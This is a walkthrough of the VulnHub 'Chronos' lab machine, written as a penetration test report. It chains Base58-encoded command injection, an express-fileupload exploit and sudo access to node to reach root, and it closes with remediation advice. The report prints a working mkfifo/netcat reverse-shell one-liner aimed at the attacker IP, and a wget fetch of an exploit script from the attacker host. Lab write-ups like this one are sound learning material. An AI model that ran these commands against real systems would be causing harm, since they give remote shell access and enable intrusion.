# 📝 Penetration Testing Report

# 🎯 VulnHub — Chronos

> **📌 Platform:** VulnHub  
> **🖥️ Lab Machine:** Chronos  
> **💻 Attacking Machine:** Kali Linux  
> **🌐 Environment:** Oracle VirtualBox — Host-Only Network  
> **🎯 Assessment Type:** Black-box penetration test

---

# 📖 1. Executive Summary

During the assessment of the **Chronos** virtual machine, I identified an attack chain that allowed me to move from initial network reconnaissance to **full root-level compromise**.

The attack path was:

```
Host Discovery
      │
      ▼
Port Enumeration
      │
      ▼
Web Application Enumeration
      │
      ▼
Source Code Analysis
      │
      ▼
Hidden Service Discovery
      │
      ▼
Burp Suite Analysis
      │
      ▼
Base58 Encoding Discovery
      │
      ▼
Command Injection
      │
      ▼
Reverse Shell
      │
      ▼
Local Enumeration
      │
      ▼
express-fileupload 1.1.7
      │
      ▼
File Upload Exploitation
      │
      ▼
User: imera
      │
      ▼
Sudo Enumeration
      │
      ▼
Node.js Sudo Misconfiguration
      │
      ▼
Root Access
      │
      ▼
🏁 root.txt
```

The main security issues identified during the assessment were:

- 🔴 Command Injection in the web application
- 🔴 Use of a vulnerable `express-fileupload` dependency
- 🟠 Excessive `sudo` privileges assigned to the `imera` user
- 🔴 Ability to chain the vulnerabilities and obtain complete system compromise

The overall risk of the identified attack chain is assessed as **Critical**.

---

# 🛠️ 2. Tools Used

| Tool         | Purpose                                |
| ------------ | -------------------------------------- |
| `arp-scan`   | Host discovery                         |
| `nmap`       | Port and service enumeration           |
| `Gobuster`   | Web directory enumeration              |
| `Burp Suite` | HTTP request interception and analysis |
| `Python`     | HTTP server and shell stabilization    |
| `wget`       | File transfer to the target            |
| `netcat`     | Reverse shell listener                 |
| `GTFOBins`   | Privilege escalation research          |

---

# 🌐 3. Scope

### Target

```
192.168.96.27
```

### Attacking Machine

```
192.168.96.3
```

Both systems were running inside an isolated **VirtualBox Host-Only network**.

---

# 🔎 4. Host Discovery

## 🎯 Objective

The first step was to determine the IP address of the target machine.

Since the machine was located inside my VirtualBox Host-Only network, I used `arp-scan` to identify active hosts:

```
sudo arp-scan -I eth1 192.168.96.0/24
```

The target was identified as:

```
192.168.96.27
```

### 💭 Analysis

Once the target IP address was identified, I moved to port enumeration to understand the available attack surface.

---

# 🔍 5. Port Enumeration

I performed a full TCP port scan using Nmap:

```
nmap -sV -A -p- 192.168.96.27
```

After identifying the open ports, I enumerated the individual services separately with Nmap to obtain additional information and compare the results.

### 💭 Why?

At this stage, I wanted to understand:

- which services were exposed;
- which versions were being used;
- what technologies were running behind the services;
- whether any additional attack vectors were available.

The web service became the primary focus of the assessment.

---

# 🌐 6. Web Enumeration

I first performed directory enumeration using Gobuster:

```
gobuster dir \
-u http://192.168.96.27/ \
-w /usr/share/wordlists/dirb/common.txt
```

Nothing immediately interesting was discovered.

Because automated enumeration did not provide an obvious entry point, I decided to switch to **manual analysis of the web application**.

---

# 🧩 7. Source Code Analysis

While inspecting the source code of the web page, I discovered the following URL:

```
http://chronos.local:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL
```

I opened the URL and received:

```
Permission Denied
```

This was interesting because the application on port `8000` had not been identified during the initial directory enumeration.

I therefore manually accessed:

```
http://chronos.local:8000/
```

The page displayed information similar to the service running on port 80.

### 💭 Analysis

At this point, I suspected that port `8000` contained additional application logic.

Instead of continuing with automated enumeration, I decided to inspect the HTTP requests directly.

---

# 🕵️ 8. HTTP Request Analysis — Burp Suite

I opened **Burp Suite** and used:

```
Proxy → Intercept
```

I then refreshed:

```
http://chronos.local:8000/
```

A GET request was intercepted.

After clicking **Forward**, I noticed that the User-Agent value changed to:

```
User-Agent: Chronos
```

I sent the request to **Repeater** so that I could modify individual parameters and observe how the application responded.

---

# 🔐 9. Base58 Encoding Discovery

In Burp Repeater, I started modifying the request and observing the application's responses.

At one point, the application returned:

```
Today is Tuesday, August 25, 2026 17:09:35.
```

I suspected that the data being submitted to the application was encoded.

To test this hypothesis, I initially tried Base64 encoding.

The application responded with:

```
Error: Non-base58 character
```

💡 This was an important clue.

The error explicitly referenced **Base58**, indicating that the application expected the supplied data to be encoded using Base58.

---

# 💉 10. Command Injection

After identifying the encoding mechanism, I wanted to determine whether the encoded input was simply being decoded or whether it was subsequently processed by the server.

I first sent a test string:

```
Hello is Tuesday, August 25, 2026 17:09:35.
```

After encoding it using Base58, the request was accepted successfully.

This confirmed that I could control the data being processed by the application.

I then started testing whether system commands could be executed.

For example:

```
nc -h
```

and:

```
nc --help
```

Most attempts returned:

```
Something went wrong
```

However, when I tested:

```
which mkfifo
```

the application did not return an error.

### 💭 Analysis

At this point, I began considering whether I could use the discovered behavior to obtain a reverse shell instead of executing individual commands.

---

# 🔄 11. Reverse Shell

I prepared the following reverse shell:

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.96.3 12345 >/tmp/f
```

The command was encoded using Base58 before being sent to the application.

On my Kali machine, I started a Netcat listener:

```
nc -lp 12345
```

After sending the prepared HTTP request, the connection was established.

🎯 I successfully obtained a shell on the target machine.

---

# 🐚 12. Shell Stabilization

The initial shell was inconvenient to work with, so I attempted to make it more interactive.

First, I checked whether Python was available:

```
which python
```

Python was installed.

I then executed:

```
python -c "import pty; pty.spawn('/bin/bash')"
```

This provided a much more convenient interactive shell for further enumeration.

---

# 🔎 13. Local Enumeration

After obtaining the initial shell, I performed basic local enumeration:

```
id
whoami
pwd
hostname
sudo -l
```

I also checked the system and available privileges.

At this stage, I did not find an obvious direct path to root.

### 💭 Analysis

Rather than continuing to execute random commands, I decided to inspect the filesystem and look for applications or files that could reveal additional information.

---

# 📂 14. Application Enumeration

While navigating the filesystem, I discovered a directory named:

```
chronos-2
```

Inside it was:

```
backend
```

The `backend` directory contained application-related files.

One file immediately caught my attention:

```
package.json
```

---

# 📦 15. Vulnerable Dependency Discovery

After examining `package.json`, I discovered the following dependency:

```
express-fileupload: ^1.1.7-alpha.3
```

This immediately stood out as potentially interesting.

💭 Since this was a third-party Node.js component, I decided to research whether this version had any publicly known vulnerabilities.

---

# 💥 16. Exploitation of `express-fileupload`

During vulnerability research, I found a public Python exploit targeting the vulnerable `express-fileupload` version.

I copied the exploit to my Kali machine and modified it to match the IP address and port used in my lab environment.

Before transferring the exploit to the target, I verified that `wget` was available:

```
which wget
```

`wget` was available.

I then started an HTTP server on Kali:

```
python -m http.server
```

On the target machine, I downloaded the exploit:

```
wget http://192.168.96.3:8000/exploit.py -O /tmp/exploit.py
```

I then started a listener:

```
nc -lvp 8888
```

and executed the exploit.

The exploit successfully provided access as:

```
imera
```

---

# 👤 17. Privilege Enumeration

After obtaining access as `imera`, I performed another round of basic enumeration:

```
id
whoami
pwd
```

The most interesting result came from:

```
sudo -l
```

The output showed that the user had permission to execute:

```
/usr/local/bin/node
```

with elevated privileges.

### 💭 Analysis

This immediately looked like a potential privilege escalation vector.

Instead of trying to develop an exploitation technique from scratch, I checked **GTFOBins** for known privilege escalation techniques involving the `node` binary.

I found a suitable method for obtaining a privileged shell through Node.js.

---

# 👑 18. Privilege Escalation

I used the identified Node.js technique through `sudo`.

The command successfully resulted in:

```
root
```

Therefore, the complete privilege escalation path was:

```
Web Application
      ↓
Command Injection
      ↓
Reverse Shell
      ↓
Application Enumeration
      ↓
express-fileupload Exploit
      ↓
imera
      ↓
sudo -l
      ↓
/usr/local/bin/node
      ↓
GTFOBins
      ↓
root
```

---

# 🏁 19. Flag

After obtaining root access, I navigated to the root user's directory.

The following file was found:

```
root.txt
```

The file contained the final flag.

🎯 **The objective of the VulnHub Chronos machine was successfully completed.**

---

# ⚠️ 20. Findings & Risk Assessment

|#|Finding|Severity|CVSS|
|---|---|---|---|
|1|Command Injection in web application|🔴 Critical|**9.8**|
|2|Vulnerable `express-fileupload` dependency|🔴 Critical|**9.8**|
|3|Excessive `sudo` privileges for Node.js|🔴 Critical|**9.8**|
|4|Reverse shell possible through command execution|🔴 Critical|Consequence of Command Injection|
|5|Outdated application components|🟠 High|Version-dependent|

> **Note:** The CVSS values above are approximate assessments for the VulnHub laboratory environment. In a real penetration test, the final CVSS score should be calculated against the exact affected component/version and the specific exploitation conditions.

---

# 🔴 Finding 1 — Command Injection

### Description

The web application accepted user-controlled data which, after Base58 decoding, was processed by the server in a way that allowed operating-system commands to be executed.

### Attack Path

```
HTTP Request
     ↓
Base58 Encoded Input
     ↓
Server-Side Processing
     ↓
Command Injection
     ↓
OS Command Execution
```

### Impact

An attacker could execute commands in the context of the web application and use this capability to obtain a reverse shell.

### Severity

🔴 **Critical — CVSS 9.8**

### Recommended Remediation

- Never pass user-controlled input directly to operating-system commands.
- Use strict allowlists for accepted input.
- Avoid `exec`, `system`, shell interpretation, and similar mechanisms where possible.
- Validate and normalize input before processing.
- Apply least-privilege permissions to the application service account.

---

# 🔴 Finding 2 — Vulnerable `express-fileupload`

### Description

The backend application used:

```
express-fileupload ^1.1.7-alpha.3
```

Research revealed a publicly available exploit affecting the vulnerable dependency.

Exploitation allowed me to obtain access as the `imera` user.

### Impact

An attacker who had reached the vulnerable application could use the vulnerable dependency to execute actions on the server and obtain access as another system user.

### Severity

🔴 **Critical — CVSS 9.8**

### Recommended Remediation

- Upgrade `express-fileupload` to a secure supported version.
- Regularly audit third-party dependencies.
- Use `npm audit` and other software composition analysis tools.
- Pin dependency versions.
- Remove unnecessary dependencies.
- Monitor dependencies for newly disclosed vulnerabilities.

---

# 🔴 Finding 3 — Excessive Sudo Privileges

### Description

The `imera` user was permitted to execute:

```
/usr/local/bin/node
```

using `sudo`.

Because Node.js can execute arbitrary JavaScript, allowing an untrusted user to execute the interpreter with elevated privileges effectively provided a path to a privileged shell.

### Impact

An attacker who compromised the `imera` account could use the permitted Node.js binary to obtain:

```
root
```

### Severity

🔴 **Critical — CVSS 9.8**

### Recommended Remediation

- Do not allow users to execute `node` through `sudo` unless strictly required.
- Apply the principle of least privilege.
- Restrict users to specific required commands rather than general-purpose interpreters.
- Regularly review `/etc/sudoers` and included configuration files.
- Avoid granting elevated access to interpreters and scripting runtimes.

---

# 🧠 21. Attack Chain Analysis

The most interesting part of this machine was not a single vulnerability, but the way each discovery led to the next step.

```
192.168.96.27
      │
      ▼
Port Enumeration
      │
      ▼
HTTP
      │
      ▼
Source Code
      │
      ▼
chronos.local:8000
      │
      ▼
Burp Suite
      │
      ▼
Base58
      │
      ▼
Command Injection
      │
      ▼
Reverse Shell
      │
      ▼
chronos-2/backend
      │
      ▼
package.json
      │
      ▼
express-fileupload
      │
      ▼
Public Exploit
      │
      ▼
imera
      │
      ▼
sudo -l
      │
      ▼
/usr/local/bin/node
      │
      ▼
GTFOBins
      │
      ▼
👑 ROOT
```

### 💡 What was important during the analysis?

I did not need to immediately search for a complete exploit for the entire machine.

Instead, each stage provided information that led to the next stage:

1. **Nmap** revealed the exposed web service.
2. Manual web analysis revealed the hidden service on port `8000`.
3. **Burp Suite** allowed me to analyze the HTTP request and application behavior.
4. The `Non-base58 character` error revealed the encoding mechanism.
5. Testing the application's behavior led to the discovery of **Command Injection**.
6. After obtaining a shell, filesystem enumeration led to the `package.json` file.
7. `package.json` revealed the vulnerable dependency.
8. Vulnerability research led to exploitation of `express-fileupload`.
9. This resulted in access as `imera`.
10. `sudo -l` revealed excessive privileges for `/usr/local/bin/node`.
11. **GTFOBins** provided a known privilege escalation technique.
12. The final result was **root access**.

This was the main lesson from the machine: **enumeration is not just about collecting information — it is about continuously using each piece of information to form the next hypothesis.**

---

# 📊 22. Overall Risk

## 🔴 CRITICAL

The identified attack chain allowed an attacker with network access to the application to:

- discover a hidden service;
- manipulate application input;
- execute operating-system commands;
- obtain a reverse shell;
- exploit a vulnerable application dependency;
- obtain access as another system user;
- abuse excessive `sudo` permissions;
- obtain **root privileges**.

### Final Assessment

**Overall Risk: 🔴 CRITICAL**

The primary security concern was not simply the presence of individual vulnerabilities, but the ability to combine them into a single attack chain resulting in **complete system compromise**.